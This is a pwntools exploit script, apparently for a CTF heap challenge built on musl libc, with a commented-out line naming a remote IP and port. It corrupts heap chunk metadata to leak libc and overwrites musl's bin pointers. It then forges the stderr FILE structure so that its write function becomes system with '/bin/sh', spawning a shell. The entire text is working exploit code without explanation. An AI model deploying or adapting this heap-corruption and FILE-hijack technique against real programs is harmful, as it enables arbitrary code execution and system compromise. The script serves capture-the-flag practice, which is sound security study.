from pwn import*
context(os='linux',arch='amd64')
context.log_level=True
libc=ELF('musl-1.1.24-libc.so')
#p = process(["./ld-2.27.so", "./a"],env={"LD_PRELOAD":"./libc-2.27.so"})
p=process('./pwn2',env={'LD_PRELOAD':'./libc.so'})
#p=process('./pwn1')
#p=remote('58.240.236.232',18886)
def add(size,data=''):
	p.recvuntil('>> ')
	p.sendline('1')

	p.recvuntil('ize: ')
	p.sendline(str(size))
	p.recvuntil('ontent: ')
	p.sendline(str(data))
def show(id):
	p.recvuntil('>> ')
	p.sendline('3')
	p.recvuntil('ndex: ')
	p.sendline(str(id))

def delete(id):
	p.recvuntil('>> ')
	p.sendline('2')
	p.recvuntil('ndex: ')
	p.sendline(str(id))
def edit(id,data):
	p.recvuntil('>> ')
	p.sendline('4')
	p.recvuntil('ndex: ')
	p.sendline(str(id))
	p.recvuntil('ontent: ')
	p.send(str(data))
add(0x10,'a')
add(0x10,'b')
add(0x10,'b')
add(0x10,'b') #3
add(0x10,'b')
add(0x10,'b')
add(0x40,'b')
add(0x40,'b') #7

delete(2)

add(0x10,'b'*0x10+p64(0x41)+p64(0xc41)) #2
delete(0)
add(0x10,'b'*0x10+p64(0x21)+p64(0x41))
delete(1)
add(0x10,'a') #1
show(2)

p.recvuntil('ontent: ')
leak=u64(p.recv(6).ljust(0x8,'\x00'))

libcbase=leak-(0x7ffff7ffba80-0x00007ffff7d5f000)
print hex(leak)

stderr=libcbase+(0x7ffff7ffb2c0-0x00007ffff7d5f000)-0x40

add(0x10,'a') #8
delete(0)
delete(2)

add(0x10,'b'*0x10+p64(0x21)+p64(0x21)+'b'*0x10+p64(0x21)+p64(0x21)+p64(stderr)*2) #0

add(0x10,'b') #2
delete(0)

delete(6)

bin2=libcbase+(0x7ffff7ffbab8-0x00007ffff7d5f000)-8
edit(8,p64(stderr)+p64(bin2))
system=libcbase+libc.sym['system']
add(0x10,'b') #0

payload  = 'a'*0x30+"/bin/sh\x00"    # stdin->flags
payload += p64(0x111)+p64(0x222)
payload += 'X' * 0x10
payload += p64(stderr+0x100)  # stdin->wpos
payload += 'X' * 8
payload += p64(0xbeefdead)  # stdin->wbase
payload += 'X' * 8
payload += p64(system)*2     # stdin->write

print hex(libcbase)
add(0x40,payload) #6
attach(p,'b *0x0000555555555510\nb *(0x00007ffff7d5f000+0x04F2C7)')



p.sendline('5')
'''
p.sendline(str(6))

p.send(str('d'*0x40))
'''
p.interactive()


